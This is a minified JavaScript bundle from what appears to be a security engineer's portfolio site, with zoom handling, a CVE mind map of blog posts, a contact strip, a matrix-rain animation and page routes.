A=="function"?A.apply(S,L):A,ye=Math.max(D[1][0]-D[0][0],D[1][1]-D[0][1]),W=S.__zoom,ve=typeof I=="function"?I.apply(S,L):I,le=o(W.invert(B).concat(ye/W.k),ve.invert(B).concat(ye/ve.k));return function(de){if(de===1)de=ve;else{var ln=le(de),Oi=ye/ln[2];de=new fn(Oi,B[0]-ln[0]*Oi,B[1]-ln[1]*Oi)}R.zoom(null,de)}})}function T(_,I,A){return!A&&_.__zooming||new P(_,I)}function P(_,I){this.that=_,this.args=I,this.active=0,this.sourceEvent=null,this.extent=n.apply(_,I),this.taps=0}P.prototype={event:function(_){return _&&(this.sourceEvent=_),this},start:function(){return++this.active===1&&(this.that.__zooming=this,this.emit("start")),this},zoom:function(_,I){return this.mouse&&_!=="mouse"&&(this.mouse[1]=I.invert(this.mouse[0])),this.touch0&&_!=="touch"&&(this.touch0[1]=I.invert(this.touch0[0])),this.touch1&&_!=="touch"&&(this.touch1[1]=I.invert(this.touch1[0])),this.that.__zoom=I,this.emit("zoom"),this},end:function(){return--this.active===0&&(delete this.that.__zooming,this.emit("end")),this},emit:function(_){var I=pn(this.that).datum();c.call(_,this.that,new h1(_,{sourceEvent:this.sourceEvent,target:d,transform:this.that.__zoom,dispatch:c}),I)}};function N(_,...I){if(!e.apply(this,arguments))return;var A=T(this,I).event(_),z=this.__zoom,S=Math.max(i[0],Math.min(i[1],z.k*Math.pow(2,s.apply(this,arguments)))),L=qn(_);if(A.wheel)(A.mouse[0][0]!==L[0]||A.mouse[0][1]!==L[1])&&(A.mouse[1]=z.invert(A.mouse[0]=L)),clearTimeout(A.wheel);else{if(z.k===S)return;A.mouse=[L,z.invert(L)],Mr(this),A.start()}rs(_),A.wheel=setTimeout(R,k),A.zoom("mouse",t(m(p(z,S),A.mouse[0],A.mouse[1]),A.extent,a));function R(){A.wheel=null,A.end()}}function j(_,...I){if(f||!e.apply(this,arguments))return;var A=_.currentTarget,z=T(this,I,!0).event(_),S=pn(_.view).on("mousemove.zoom",B,!0).on("mouseup.zoom",ye,!0),L=qn(_,A),R=_.clientX,D=_.clientY;Qv(_.view),ca(_),z.mouse=[L,this.__zoom.invert(L)],Mr(this),z.start();function B(W){if(rs(W),!z.moved){var ve=W.clientX-R,le=W.clientY-D;z.moved=ve*ve+le*le>y}z.event(W).zoom("mouse",t(m(z.that.__zoom,z.mouse[0]=qn(W,A),z.mouse[1]),z.extent,a))}function ye(W){S.on("mousemove.zoom mouseup.zoom",null),Zv(W.view,z.moved),rs(W),z.event(W).end()}}function M(_,...I){if(e.apply(this,arguments)){var A=this.__zoom,z=qn(_.changedTouches?_.changedTouches[0]:_,this),S=A.invert(z),L=A.k*(_.shiftKey?.5:2),R=t(m(p(A,L),z,S),n.apply(this,I),a);rs(_),l>0?pn(this).transition().duration(l).call(x,R,z,_):pn(this).call(d.transform,R,z,_)}}function Q(_,...I){if(e.apply(this,arguments)){var A=_.touches,z=A.length,S=T(this,I,_.changedTouches.length===z).event(_),L,R,D,B;for(ca(_),R=0;R<z;++R)D=A[R],B=qn(D,this),B=[B,this.__zoom.invert(B),D.identifier],S.touch0?!S.touch1&&S.touch0[2]!==B[2]&&(S.touch1=B,S.taps=0):(S.touch0=B,L=!0,S.taps=1+!!u);u&&(u=clearTimeout(u)),L&&(S.taps<2&&(h=B[0],u=setTimeout(function(){u=null},g)),Mr(this),S.start())}}function pe(_,...I){if(this.__zooming){var A=T(this,I).event(_),z=_.changedTouches,S=z.length,L,R,D,B;for(rs(_),L=0;L<S;++L)R=z[L],D=qn(R,this),A.touch0&&A.touch0[2]===R.identifier?A.touch0[0]=D:A.touch1&&A.touch1[2]===R.identifier&&(A.touch1[0]=D);if(R=A.that.__zoom,A.touch1){var ye=A.touch0[0],W=A.touch0[1],ve=A.touch1[0],le=A.touch1[1],de=(de=ve[0]-ye[0])*de+(de=ve[1]-ye[1])*de,ln=(ln=le[0]-W[0])*ln+(ln=le[1]-W[1])*ln;R=p(R,Math.sqrt(de/ln)),D=[(ye[0]+ve[0])/2,(ye[1]+ve[1])/2],B=[(W[0]+le[0])/2,(W[1]+le[1])/2]}else if(A.touch0)D=A.touch0[0],B=A.touch0[1];else return;A.zoom("touch",t(m(R,D,B),A.extent,a))}}function ae(_,...I){if(this.__zooming){var A=T(this,I).event(_),z=_.changedTouches,S=z.length,L,R;for(ca(_),f&&clearTimeout(f),f=setTimeout(function(){f=null},g),L=0;L<S;++L)R=z[L],A.touch0&&A.touch0[2]===R.identifier?delete A.touch0:A.touch1&&A.touch1[2]===R.identifier&&delete A.touch1;if(A.touch1&&!A.touch0&&(A.touch0=A.touch1,delete A.touch1),A.touch0)A.touch0[1]=this.__zoom.invert(A.touch0[0]);else if(A.end(),A.taps===2&&(R=qn(R,this),Math.hypot(h[0]-R[0],h[1]-R[1])<w)){var D=pn(this).on("dblclick.zoom");D&&D.apply(this,arguments)}}}return d.wheelDelta=function(_){return arguments.length?(s=typeof _=="function"?_:vr(+_),d):s},d.filter=function(_){return arguments.length?(e=typeof _=="function"?_:vr(!!_),d):e},d.touchable=function(_){return arguments.length?(r=typeof _=="function"?_:vr(!!_),d):r},d.extent=function(_){return arguments.length?(n=typeof _=="function"?_:vr([[+_[0][0],+_[0][1]],[+_[1][0],+_[1][1]]]),d):n},d.scaleExtent=function(_){return arguments.length?(i[0]=+_[0],i[1]=+_[1],d):[i[0],i[1]]},d.translateExtent=function(_){return arguments.length?(a[0][0]=+_[0][0],a[1][0]=+_[1][0],a[0][1]=+_[0][1],a[1][1]=+_[1][1],d):[[a[0][0],a[0][1]],[a[1][0],a[1][1]]]},d.constrain=function(_){return arguments.length?(t=_,d):t},d.duration=function(_){return arguments.length?(l=+_,d):l},d.interpolate=function(_){return arguments.length?(o=_,d):o},d.on=function(){var _=c.on.apply(c,arguments);return _===c?d:_},d.clickDistance=function(_){return arguments.length?(y=(_=+_)*_,d):Math.sqrt(y)},d.tapDistance=function(_){return arguments.length?(w=+_,d):w},d}const k1={domain:"#00ff41",technology:"#00ff41",cluster:"#00ff41",cve:"#00ff41"};function b1(e,n){const t=[],s=[],r=(i,a=null,l=0)=>{var f,g;const o=i.id||i.name||`${i.nodeType}-${t.length}`;t.push({id:o,name:i.name,type:i.nodeType||(i.children?"group":"cve"),metrics:i.metrics,info:i,depth:l}),a&&s.push({source:a,target:o});const c=n.has(o),u=((g=(f=i.children)==null?void 0:f[0])==null?void 0:g.nodeType)||null;if(!(!(l<2||c)||!i.children)){for(const k of i.children)k.nodeType==="cve"&&!c||r(k,o,l+1);if(!c&&i.children&&u!=="cve"&&i.children.length){const k=`${o}-collapsed`;t.push({id:k,name:"+",type:"collapsed",depth:l+1,info:{hint:`${i.children.length} hidden`}}),s.push({source:o,target:k})}}};return r(e,null,0),{nodes:t,links:s}}function x1({data:e,onSelectCve:n,highlightId:t,hoveredId:s,onHover:r,onFocusPath:i}){const a=E.useRef(null),[l,o]=E.useState(new Set),[c,u]=E.useState({nodes:[],links:[]}),[h,f]=E.useState(xo),{nodes:g,links:k}=E.useMemo(()=>b1(e,l),[e,l]),y=E.useMemo(()=>{const p=new Map;return c.nodes.forEach(m=>p.set(m.id,m)),p},[c.nodes]);E.useEffect(()=>{if(!t||!e)return;const p=[],m=(v,x)=>{const T=v.id||v.name,P=[...x,v.name];if((T==null?void 0:T.toLowerCase())===t.toLowerCase())return p.push(...P),!0;if(!v.children)return!1;for(const N of v.children)if(m(N,P))return!0;return!1};m(e,[]),p.length&&(i==null||i(p))},[t,e,i]),E.useEffect(()=>{if(!g.length)return;pn(a.current);const v=p1(g).force("link",s1(k).id(x=>x.id).distance(x=>x.target.type==="cve"?90:x.target.type==="cluster"?140:200).strength(.8)).force("charge",d1().strength(-260)).force("center",zw(960/2,640/2)).force("collision",n1().radius(x=>x.type==="cve"?26:38)).stop();for(let x=0;x<200;x+=1)v.tick();return u({nodes:[...v.nodes()],links:k.map(x=>({source:x.source.id,target:x.target.id}))}),()=>v.stop()},[g,k]),E.useEffect(()=>{const p=pn(a.current),m=w1().scaleExtent([.6,2.5]).on("zoom",v=>f(v.transform));return p.call(m),()=>p.on(".zoom",null)},[]);const w=p=>{const m=p.id;m&&o(v=>{const x=new Set(v);return x.has(m)?x.delete(m):x.add(m),x})},d=p=>{if(p.type==="cve")n==null||n(p.info);else if(p.type==="collapsed"){const m=p.id.replace("-collapsed","");o(v=>new Set([...v,m]))}else w(p)};return b.jsx("div",{className:"cve-mindmap",children:b.jsxs("svg",{ref:a,viewBox:"0 0 960 640",role:"presentation",children:[b.jsx("defs",{children:b.jsxs("filter",{id:"glow",children:[b.jsx("feGaussianBlur",{stdDeviation:"2.5",result:"coloredBlur"}),b.jsxs("feMerge",{children:[b.jsx("feMergeNode",{in:"coloredBlur"}),b.jsx("feMergeNode",{in:"SourceGraphic"})]})]})}),b.jsxs("g",{transform:`translate(${h.x},${h.y}) scale(${h.k})`,children:[c.links.map(p=>{var m,v,x,T;return b.jsx("line",{x1:(m=y.get(p.source))==null?void 0:m.x,y1:(v=y.get(p.source))==null?void 0:v.y,x2:(x=y.get(p.target))==null?void 0:x.x,y2:(T=y.get(p.target))==null?void 0:T.y,stroke:"rgba(0, 255, 65, 0.35)",strokeWidth:s&&(p.source.id===s||p.target.id===s)?2:1,strokeDasharray:p.target.type==="collapsed"?"4 4":"0"},`${p.source.id}-${p.target.id}`)}),c.nodes.map(p=>{var T;const m=p.type==="cve"?14:p.type==="cluster"?18:24,v=t&&((T=p.id)==null?void 0:T.toLowerCase())===t.toLowerCase(),x=k1[p.type]||"#8fd6ff";return b.jsxs("g",{transform:`translate(${p.x},${p.y})`,className:`mindmap-node ${p.type}`,onClick:()=>d(p),onMouseEnter:()=>{var P;if(r){const[N,j]=h.apply([p.x,p.y]),M=(P=a.current)==null?void 0:P.getBoundingClientRect();r({node:p,screen:{x:M?M.left+N:N,y:M?M.top+j:j}})}},onMouseLeave:()=>r==null?void 0:r(null),style:{cursor:"pointer"},children:[b.jsx("circle",{r:m,fill:x,fillOpacity:v?1:.7,stroke:v?"#00ff41":"rgba(255,255,255,0.12)",strokeWidth:v?2:1,filter:"url(#glow)"}),b.jsx("text",{textAnchor:"middle",dy:"0.35em",fontSize:11,fill:"#000000",children:p.type==="collapsed"?"+":p.name})]},p.id)})]})]})})}function _1(e=[],n="year"){const t=i=>n==="severity"?i.severity||"Info":i.year||"Unknown",s=e.reduce((i,a)=>{const l=t(a);return i[l]||(i[l]=[]),i[l].push(a),i},{}),r=n==="severity"?(i,a)=>i.localeCompare(a):(i,a)=>a.localeCompare(i);return{name:"CVE Map",children:Object.keys(s).sort(r).map(i=>({id:`${n}-${i}`,name:i,nodeType:"cluster",children:s[i].map(a=>({...a,name:a.id||a.title,value:1,nodeType:"cve"}))}))}}function S1(){const[e,n]=E.useState("year"),t=E.useMemo(()=>{const d=m=>m.toUpperCase().includes("CVE"),p=m=>{if(!m)return"Unknown";const x=new Date(m).getFullYear();return Number.isFinite(x)?String(x):"Unknown"};return po.filter(m=>d(m.title)).map(m=>{const v=m.title.match(/CVE[-–](\d{4})[-–]?([\d]+)/i);return{id:v?`CVE-${v[1]}-${v[2]}`:m.slug.toUpperCase(),title:m.title,severity:"Info",cvss:0,year:p(m.date),kev:!1,summary:m.excerpt,href:m.href||`/blog/${m.slug}`}})},[]),s=E.useMemo(()=>_1(t,e),[t,e]),[r,i]=E.useState(null),[a,l]=E.useState([]),[o,c]=E.useState(0),[u,h]=E.useState(null),[f,g]=E.useState(null),[k,y]=E.useState(""),w=d=>{i(d),y((d==null?void 0:d.id)||"")};return b.jsxs("div",{className:"cve-fullscreen",children:[b.jsx("div",{className:"mindmap-stage mindmap-shell",children:b.jsxs("div",{className:"mindmap-canvas",children:[b.jsx(x1,{data:s,onSelectCve:w,onFocusPath:l,highlightId:k,onHover:d=>{var p,m;h((d==null?void 0:d.node)||null),d&&d.screen?g({name:d.node.name,title:((p=d.node.info)==null?void 0:p.title)||d.node.name,href:(m=d.node.info)==null?void 0:m.href,x:d.screen.x,y:d.screen.y}):g(null)},hoveredId:u==null?void 0:u.id},o),f&&b.jsxs("div",{className:"mindmap-preview",style:{left:f.x,top:f.y},children:[b.jsx("div",{className:"preview-title",children:f.title}),f.href?b.jsx("a",{href:f.href,target:"_blank",rel:"noreferrer",children:"open blog"}):null]})]})}),b.jsx(fy,{cve:r,onClose:()=>i(null)})]})}function E1(){const e="hemparekh1596@gmail.com",[n,t]=E.useState(!1),s=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).then(()=>{t(!0),setTimeout(()=>t(!1),1800)}).catch(()=>{})};return b.jsx("section",{className:"contact-strip",id:"contact",children:b.jsxs("div",{className:"container contact-grid",children:[b.jsxs("div",{children:[b.jsx("p",{className:"pill",children:"Let’s talk"}),b.jsx("h2",{children:"Signal received. Drop a note and let’s build secure systems."}),b.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."}),n&&b.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),b.jsxs("div",{className:"contact-actions",children:[b.jsx("button",{className:"button primary",onClick:s,type:"button",children:"Copy Email"}),b.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),b.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function T1(){const[e,n]=E.useState(0);return E.useEffect(()=>{const t=()=>{const{scrollTop:s,scrollHeight:r,clientHeight:i}=document.documentElement,a=r>i?s/(r-i)*100:0;n(Math.min(100,Math.max(0,a)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),b.jsx("div",{className:"scroll-progress",children:b.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function C1(){const[e,n]=E.useState(!1);return E.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?b.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function A1(){const e=E.useRef(null),n=E.useRef(null);return E.useEffect(()=>{const t=e.current;if(!t)return()=>{};const s=t.getContext("2d");let r=t.width=window.innerWidth,i=t.height=window.innerHeight;const a=16;let l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:.5+Math.random()*.9}));const c="アカサタナハマヤラワ0123456789日田由止育宇禾水火木金土文ﾊﾐﾋﾑﾍﾎｱｶｻﾀﾅﾊﾏ",u=()=>{s.fillStyle="rgba(0, 0, 0, 0.12)",s.fillRect(0,0,r,i),s.font=`${a}px "IBM Plex Mono", monospace`,o.forEach((f,g)=>{const k=c[Math.floor(Math.random()*c.length)],y=g*a,w=f.y*a;s.fillStyle="rgba(200, 200, 200, 0.9)",s.fillText(k,y,w),s.fillStyle="rgba(200, 200, 200, 0.18)",s.fillText(k,y,w-a),f.y+=f.speed,f.y*a>i&&Math.random()>.95&&(f.y=0,f.speed=.5+Math.random()*.9)}),n.current=requestAnimationFrame(u)},h=()=>{r=t.width=window.innerWidth,i=t.height=window.innerHeight,l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:1+Math.random()*2}))};return window.addEventListener("resize",h),u(),()=>{window.removeEventListener("resize",h),n.current&&cancelAnimationFrame(n.current)}},[]),b.jsx("canvas",{ref:e,className:"matrix-rain","aria-hidden":"true"})}function P1(){const[e,n]=E.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return E.useEffect(()=>{const s=document.body;s.classList.remove("light","dark"),s.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(s=>s==="light"?"dark":"light")}}}function N1(){const{theme:e,toggleTheme:n}=P1(),[t,s]=E.useState(!0),[r,i]=E.useState(!0),a=E.useCallback((o,c)=>{const u=document.body;u&&(o?u.classList.remove("hud-scanlines-off"):u.classList.add("hud-scanlines-off"),c?u.classList.remove("hud-noise-off"):u.classList.add("hud-noise-off"))},[]);E.useEffect(()=>{try{const o=localStorage.getItem("hud:scanlines")!=="off",c=localStorage.getItem("hud:noise")!=="off";s(o),i(c),a(o,c)}catch{a(!0,!0)}},[a]),E.useEffect(()=>{try{localStorage.setItem("hud:scanlines",t?"on":"off"),localStorage.setItem("hud:noise",r?"on":"off")}catch{}a(t,r)},[t,r,a]);const l=E.useCallback(()=>{if(typeof window<"u"){window.dispatchEvent(new CustomEvent("hud:reset-layout",{detail:"all"}));try{Object.keys(localStorage).filter(o=>o.startsWith("hud:window:")||o.startsWith("hud:")).forEach(o=>localStorage.removeItem(o))}catch{}}},[]);return E.useEffect(()=>{const o=c=>{if(!((c.ctrlKey||c.metaKey)&&c.shiftKey))return;const u=c.key.toLowerCase();u==="r"&&(c.preventDefault(),l()),u==="s"&&(c.preventDefault(),s(h=>!h)),u==="n"&&(c.preventDefault(),i(h=>!h))};return window.addEventListener("keydown",o),()=>window.removeEventListener("keydown",o)},[l]),b.jsx(zg,{children:b.jsxs("div",{className:"app-shell",children:[b.jsx(A1,{}),b.jsx(T1,{}),b.jsx(Fg,{onToggleTheme:n,theme:e}),b.jsx("main",{children:b.jsxs(Pg,{children:[b.jsx(_n,{path:"/",element:b.jsx(Hc,{})}),b.jsx(_n,{path:"/blogs",element:b.jsx(Yg,{})}),b.jsx(_n,{path:"/projects",element:b.jsx(dy,{})}),b.jsx(_n,{path:"/certifications",element:b.jsx(hy,{})}),b.jsx(_n,{path:"/blog/:slug",element:b.jsx(py,{})}),b.jsx(_n,{path:"/cve-map",element:b.jsx(S1,{})}),b.jsx(_n,{path:"*",element:b.jsx(Hc,{})})]})}),b.jsx(E1,{}),b.jsx(Ug,{}),b.jsx(C1,{})]})})}_d(document.getElementById("root")).render(b.jsx(ku.StrictMode,{children:b.jsx(N1,{})}));
